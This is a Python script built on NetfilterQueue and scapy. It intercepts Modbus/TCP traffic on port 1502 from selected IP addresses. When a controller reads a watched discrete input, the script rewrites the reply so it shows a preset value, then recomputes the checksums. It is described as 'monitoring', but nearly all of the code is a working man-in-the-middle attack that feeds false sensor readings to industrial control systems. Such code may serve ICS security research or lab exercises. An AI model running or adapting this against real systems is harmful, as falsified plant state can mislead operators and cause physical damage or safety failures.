from netfilterqueue import NetfilterQueue as nfq
from scapy.layers.inet import TCP, IP
from scapy.all import *

transaction = {}
monitor_discrete_input = {}
src_ips = []


def add_ip(ip):
    """
    Add source IP addresses to monitor
    :param ip: IP address to monitor
    :return: None
    """
    src_ips.append(ip)


def add_monitor_discrete_input(slave_id, address, value_should_be):
    """
    Add a discrete input to monitor
    :param slave_id: ID of the client
    :param address: Address of the discrete input
    :param value_should_be: Value that the discrete input should be
    :return: None
    """
    monitor_discrete_input[(slave_id, address)] = value_should_be


def packet_listener(pck):
    """
    Listen to packets and modify them if necessary
    :param pck: Packet to listen to
    :return: None
    """
    global transaction, monitor_discrete_input, src_ips

    scapy_packet = IP(pck.get_payload())
    if TCP in scapy_packet and (scapy_packet.src in src_ips):
        payload = bytes(scapy_packet.payload.payload)
        if len(payload) < 8:
            pck.accept()
            return

        function_code = payload[7]

        if scapy_packet.dport == 1502:
            unit_id = payload[6]
            transaction_id = payload[0:2]
            if function_code == 2:
                start_address = (payload[8] << 8) + payload[9]
                key = (unit_id, start_address)
                if key in monitor_discrete_input:
                    transaction[transaction_id] = monitor_discrete_input[key]
                    print("Monitoring discrete input: ", key, " to ", monitor_discrete_input[key])
        elif scapy_packet.sport == 1502:
            transaction_id = payload[0:2]
            if transaction_id in transaction:
                byte_count = payload[8]
                input_status = payload[9:9 + byte_count]
                value_to_set = transaction[transaction_id]
                transaction.pop(transaction_id)

                if value_to_set is not None and input_status != bytes([value_to_set]):
                    payload = payload[:9] + bytes([value_to_set]) + payload[10:]
                    scapy_packet.payload.payload = Raw(load=payload)
                    del scapy_packet[IP].chksum
                    del scapy_packet[TCP].chksum
                    del scapy_packet.chksum
                    print("Modified packet id: ", transaction_id, " to ", value_to_set)
                    pck.set_payload(bytes(scapy_packet))

    pck.accept()


def start_monitoring(queue_num=1):
    """
    Start monitoring the packets
    :param queue_num: Queue number to monitor
    :return: None
    """
    queue = nfq()
    queue.bind(queue_num, packet_listener)
    queue.run()
